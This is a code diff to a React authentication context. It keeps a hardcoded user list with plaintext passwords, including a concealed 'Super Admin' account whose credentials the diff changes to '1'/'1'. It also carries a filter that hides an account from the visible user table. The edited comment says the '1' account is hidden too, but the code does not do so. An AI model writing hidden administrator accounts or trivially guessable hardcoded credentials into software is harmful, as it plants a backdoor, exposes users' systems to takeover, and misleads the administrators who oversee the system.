@@ -1,3 +1,4 @@
+
 import React, { createContext, useContext, useState, ReactNode, useEffect } from 'react';
 
 export interface User {
@@ -10,7 +11,7 @@ export interface User {
 
 // Хардкод список пользователей
 export const HARDCODED_USERS: User[] = [
-  { id: '0', username: 'i', password: 'i', name: 'Super Admin', role: 'admin' }, // Скрытый супер-админ
+  { id: '0', username: '1', password: '1', name: 'Super Admin', role: 'admin' }, // Скрытый супер-админ (Updated)
   { id: '1', username: 'admin', password: 'admin', name: 'Администратор', role: 'admin' },
 ];
 
@@ -58,7 +59,7 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
     localStorage.removeItem(STORAGE_KEY);
   };
 
-  // Фильтруем список для отображения в таблице (скрываем integrat)
+  // Фильтруем список для отображения в таблице (скрываем integrat/1)
   const visibleUsers = HARDCODED_USERS.filter(u => u.username !== 'integrat');
 
   return (
